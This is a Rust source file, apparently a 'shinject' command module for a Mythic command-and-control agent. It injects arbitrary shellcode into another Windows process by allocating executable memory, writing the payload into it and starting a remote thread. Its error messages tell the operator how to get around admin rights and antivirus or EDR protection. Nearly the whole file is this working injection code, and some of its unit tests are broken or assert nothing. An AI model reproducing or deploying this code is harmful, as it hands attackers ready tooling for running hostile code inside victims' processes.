use serde::{Deserialize, Serialize};
use std::error::Error;
use std::result::Result;
use crate::AgentTask;
use base64::{Engine as _, engine::general_purpose};

#[cfg(target_os = "windows")]
use std::mem;
#[cfg(target_os = "windows")]
use std::ptr;
#[cfg(target_os = "windows")]
use winapi::shared::minwindef::{FALSE, DWORD, LPVOID};
#[cfg(target_os = "windows")]
use winapi::shared::basetsd::SIZE_T;
#[cfg(target_os = "windows")]
use winapi::um::processthreadsapi::*;
#[cfg(target_os = "windows")]
use winapi::um::memoryapi::*;
#[cfg(target_os = "windows")]
use winapi::um::handleapi::*;
#[cfg(target_os = "windows")]
use winapi::um::synchapi::*;
#[cfg(target_os = "windows")]
use winapi::um::errhandlingapi::GetLastError;
#[cfg(target_os = "windows")]
use winapi::um::winbase::WAIT_OBJECT_0;

// Command structure for Mythic - matching Apollo's structure
#[derive(Serialize, Deserialize)]
pub struct ShinjectArgs {
    pub pid: u32,
    #[serde(rename = "shellcode-file-id")]
    pub shellcode_file_id: Option<String>,
    #[serde(rename = "shellcode-base64")]
    pub shellcode_base64: Option<String>,
}

#[cfg(target_os = "windows")]
const PAGE_EXECUTE_READWRITE: DWORD = 0x40;
#[cfg(target_os = "windows")]
const MEM_COMMIT: DWORD = 0x1000;
#[cfg(target_os = "windows")]
const MEM_RESERVE: DWORD = 0x2000;
#[cfg(target_os = "windows")]
const PROCESS_ALL_ACCESS: DWORD = 0x1F0FFF;
#[cfg(target_os = "windows")]
const PROCESS_QUERY_INFORMATION: DWORD = 0x0400;
#[cfg(target_os = "windows")]
const STILL_ACTIVE: DWORD = 259;
#[cfg(target_os = "windows")]
const INFINITE: DWORD = 0xFFFFFFFF;
#[cfg(target_os = "windows")]
const MEM_RELEASE: DWORD = 0x8000;
#[cfg(target_os = "windows")]
const WAIT_TIMEOUT: DWORD = 0x102;

/// Wrapper function for compatibility with the tasking system
pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    let args: ShinjectArgs = serde_json::from_str(&task.parameters)
        .map_err(|e| format!("Failed to parse shinject arguments: {}", e))?;
    
    match execute_shinject(args, &task.id) {
        Ok(output) => {
            // FIX: Return plain string instead of JSON for consistency
            Ok(serde_json::Value::String(output))
        },
        Err(error) => {
            // FIX: Return error as plain string for consistency
            Ok(serde_json::Value::String(error))
        },
    }
}

/// Main command execution function
#[cfg(target_os = "windows")]
pub fn execute_shinject(args: ShinjectArgs, task_id: &str) -> Result<String, String> {
    eprintln!("DEBUG: Starting shinject execution for task {}", task_id);
    eprintln!("DEBUG: Target PID: {}", args.pid);
    
    // Get shellcode from either file ID or base64
    let shellcode_bytes = if let Some(file_id) = &args.shellcode_file_id {
        eprintln!("DEBUG: Shellcode file ID: {}", file_id);
        eprintln!("DEBUG: Attempting to get shellcode from Mythic");
        match get_shellcode_from_mythic(file_id, task_id) {
            Ok(bytes) => {
                eprintln!("DEBUG: Successfully retrieved shellcode, size: {} bytes", bytes.len());
                bytes
            },
            Err(e) => {
                eprintln!("DEBUG: Failed to get shellcode: {}", e);
                return Err(e);
            },
        }
    } else if let Some(base64_shellcode) = &args.shellcode_base64 {
        eprintln!("DEBUG: Using base64 shellcode");
        match general_purpose::STANDARD.decode(base64_shellcode) {
            Ok(bytes) => {
                eprintln!("DEBUG: Successfully decoded base64 shellcode, size: {} bytes", bytes.len());
                bytes
            },
            Err(e) => {
                eprintln!("DEBUG: Failed to decode base64 shellcode: {}", e);
                return Err(format!("Failed to decode base64 shellcode: {}", e));
            },
        }
    } else {
        eprintln!("DEBUG: No shellcode source provided");
        return Err("No shellcode source provided (neither file ID nor base64)".to_string());
    };

    // Validate shellcode size
    if shellcode_bytes.is_empty() {
        eprintln!("DEBUG: Shellcode file is empty");
        return Err("Shellcode file is empty".to_string());
    }

    // Check if process exists
    eprintln!("DEBUG: Checking if process {} exists", args.pid);
    if !process_exists(args.pid) {
        eprintln!("DEBUG: Process {} does not exist", args.pid);
        return Err(format!("No process with PID {} is running", args.pid));
    }
    eprintln!("DEBUG: Process {} exists, proceeding with injection", args.pid);

    unsafe {
        eprintln!("DEBUG: Starting shellcode injection into process {}", args.pid);
        match inject_shellcode_impl(args.pid, &shellcode_bytes) {
            Ok(output) => {
                eprintln!("DEBUG: Shellcode injection successful: {}", output);
                Ok(output)
            },
            Err(e) => {
                eprintln!("DEBUG: Shellcode injection failed: {}", e);
                Err(e)
            },
        }
    }
}

/// Check if a process with the given PID exists
#[cfg(target_os = "windows")]
fn process_exists(pid: u32) -> bool {
    unsafe {
        let handle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
        if handle.is_null() {
            return false;
        }
        let mut exit_code: DWORD = 0;
        let result = GetExitCodeProcess(handle, &mut exit_code);
        CloseHandle(handle);
        
        result != 0 && exit_code == STILL_ACTIVE
    }
}

/// Get shellcode file content - placeholder for Mythic RPC integration
#[cfg(target_os = "windows")]
fn get_shellcode_from_mythic(file_id: &str, _task_id: &str) -> Result<Vec<u8>, String> {
    eprintln!("DEBUG: Looking for shellcode file with ID: {}", file_id);
    
    // FIX: This is a placeholder - in a real implementation, you would use Mythic RPC
    // to download the file. For now, we'll use a simple file search approach.
    
    let possible_paths = vec![
        std::env::current_dir().map(|p| p.join(file_id)).unwrap_or_default(),
        std::env::temp_dir().join(file_id),
        std::path::Path::new(file_id).to_path_buf(),
        // Also check with .bin extension (common for shellcode)
        std::env::current_dir().map(|p| p.join(format!("{}.bin", file_id))).unwrap_or_default(),
        std::env::temp_dir().join(format!("{}.bin", file_id)),
    ];
    
    eprintln!("DEBUG: Searching for shellcode file in {} possible locations", possible_paths.len());
    
    // Try to find and read the file
    for (i, path) in possible_paths.iter().enumerate() {
        eprintln!("DEBUG: Checking location {}: {} (exists: {})", i + 1, path.display(), path.exists());
        if path.exists() {
            match std::fs::read(path) {
                Ok(bytes) => {
                    if !bytes.is_empty() {
                        eprintln!("DEBUG: Found shellcode file at {} ({} bytes)", path.display(), bytes.len());
                        return Ok(bytes);
                    } else {
                        eprintln!("DEBUG: File {} exists but is empty", path.display());
                    }
                }
                Err(e) => {
                    eprintln!("DEBUG: Failed to read file {}: {}", path.display(), e);
                    continue;
                }
            }
        }
    }
    
    // File not found - provide helpful error message
    let current_dir = std::env::current_dir()
        .map(|p| p.to_string_lossy().to_string())
        .unwrap_or_else(|_| "unknown".to_string());
    
    Err(format!(
        "Shellcode file '{}' not found.\n\n\
        TROUBLESHOOTING:\n\
        1. Make sure the file exists in Mythic\n\
        2. The file should be automatically downloaded by Mythic\n\
        3. Current working directory: {}\n\
        4. Searched locations:\n{}\n\n\
        Check Mythic server logs for file transfer errors.",
        file_id,
        current_dir,
        possible_paths.iter()
            .enumerate()
            .map(|(i, path)| format!("  {}. {} (exists: {})", i + 1, path.display(), path.exists()))
            .collect::<Vec<_>>()
            .join("\n")
    ))
}

/// Windows shellcode injection implementation
#[cfg(target_os = "windows")]
unsafe fn inject_shellcode_impl(process_id: u32, shellcode: &[u8]) -> Result<String, String> {
    // Open the target process
    let h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
    if h_process.is_null() {
        let error_code = GetLastError();
        return Err(format!(
            "Failed to open process with PID: {}. Error code: {}\n\n\
            Common causes:\n\
            - Process does not exist\n\
            - Insufficient privileges (try running as admin)\n\
            - Process is protected (antivirus/EDR)",
            process_id, error_code
        ));
    }

    let buffer_size = shellcode.len();
    
    // Allocate memory in the target process
    let remote_mem = VirtualAllocEx(
        h_process,
        ptr::null_mut(),
        buffer_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );

    if remote_mem.is_null() {
        CloseHandle(h_process);
        return Err(format!(
            "VirtualAllocEx failed. Error: {}\n\n\
            Failed to allocate {} bytes in target process",
            GetLastError(), buffer_size
        ));
    }

    // Write shellcode to the allocated memory
    let mut bytes_written: SIZE_T = 0;
    let write_result = WriteProcessMemory(
        h_process,
        remote_mem,
        shellcode.as_ptr() as LPVOID,
        buffer_size,
        &mut bytes_written,
    );

    if write_result == 0 || bytes_written != buffer_size {
        VirtualFreeEx(h_process, remote_mem, 0, MEM_RELEASE);
        CloseHandle(h_process);
        return Err(format!(
            "WriteProcessMemory failed. Written: {}/{} bytes. Error: {}\n\n\
            Failed to write shellcode to target process memory",
            bytes_written, buffer_size, GetLastError()
        ));
    }

    // Create remote thread to execute the shellcode
    let mut thread_id: DWORD = 0;
    let h_thread = CreateRemoteThread(
        h_process,
        ptr::null_mut(),
        0,
        Some(mem::transmute(remote_mem)),
        ptr::null_mut(),
        0,
        &mut thread_id,
    );

    if h_thread.is_null() {
        VirtualFreeEx(h_process, remote_mem, 0, MEM_RELEASE);
        CloseHandle(h_process);
        return Err(format!(
            "CreateRemoteThread failed. Error: {}\n\n\
            Failed to create execution thread in target process",
            GetLastError()
        ));
    }

    // Wait for the thread to complete (optional - you might want to remove this for async shellcode)
    let wait_result = WaitForSingleObject(h_thread, 5000); // 5 second timeout

    // Get thread exit code to check if it completed
    let mut exit_code: DWORD = 0;
    let _exit_code_result = GetExitCodeThread(h_thread, &mut exit_code);

    // Clean up handles and memory
    CloseHandle(h_thread);
    // Note: We don't free the remote memory because the shellcode is executing there
    CloseHandle(h_process);

    if wait_result == WAIT_OBJECT_0 {
        Ok(format!(
            "Successfully injected and executed shellcode in process {} (Thread ID: {}, Exit Code: {})",
            process_id, thread_id, exit_code
        ))
    } else if wait_result == WAIT_TIMEOUT {
        Ok(format!(
            "Successfully injected shellcode in process {} (Thread ID: {}) - thread still running (timeout reached)",
            process_id, thread_id
        ))
    } else {
        Ok(format!(
            "Shellcode injected in process {} (Thread ID: {}) - wait result: {}",
            process_id, thread_id, wait_result
        ))
    }
}

// macOS placeholder implementation
#[cfg(target_os = "macos")]
pub fn execute_shinject(_args: ShinjectArgs, _task_id: &str) -> Result<String, String> {
    Err("shinject command is not implemented for macOS".to_string())
}

// Fallback for other platforms
#[cfg(not(any(target_os = "windows", target_os = "macos")))]
pub fn execute_shinject(_args: ShinjectArgs, _task_id: &str) -> Result<String, String> {
    Err("shinject command is only supported on Windows".to_string())
}

/// Direct command handler for integration with command dispatch system
pub fn handle_shinject_command(args: &str, task_id: &str) -> Result<String, String> {
    let shinject_args: ShinjectArgs = serde_json::from_str(args)
        .map_err(|e| format!("Failed to parse shinject arguments: {}", e))?;
    
    execute_shinject(shinject_args, task_id)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_shinject_args_parsing() {
        let json_args = r#"{"pid": 1234, "shellcode-file-id": "test_file_id"}"#;
        let args: ShinjectArgs = serde_json::from_str(json_args).unwrap();
        assert_eq!(args.shellcode_file_id, "test_file_id");
        assert_eq!(args.pid, 1234);
    }

    #[test]
    fn test_shinject_command_handler() {
        let result = handle_shinject_command(
            r#"{"pid": 1234, "shellcode-file-id": "test"}"#, 
            "test_task_id"
        );
        // On non-Windows, this should return an error about platform not supported
        // On Windows, it will try to find the file and likely fail
        assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn test_invalid_json_handling() {
        let result = handle_shinject_command("invalid json", "test_task_id");
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("Failed to parse shinject arguments"));
    }
}